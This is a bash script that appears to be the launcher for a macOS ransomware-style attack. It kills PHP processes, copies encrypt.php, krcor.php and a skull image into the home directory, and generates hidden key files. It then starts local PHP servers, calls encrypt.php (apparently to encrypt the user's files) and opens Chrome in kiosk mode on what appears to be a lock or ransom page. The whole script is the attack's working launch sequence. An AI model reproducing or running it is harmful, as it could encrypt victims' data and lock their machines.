#!/bin/bash

DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null && pwd )"
killall php;
cp $DIR/encrypt.php ~/
cp $DIR/krcor.php ~/
cp $DIR/skull.jpg ~/
cd ~/
openssl genrsa -out ~/.key1.pem
openssl genrsa -out ~/.iv.pem
openssl genrsa -out ~/.key2.pem

php -S localhost:1338 & sleep 2
php -S localhost:1337 & sleep 2
curl localhost:1338/encrypt.php & /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --kiosk --app=http://localhost:1337/krcor.php & disown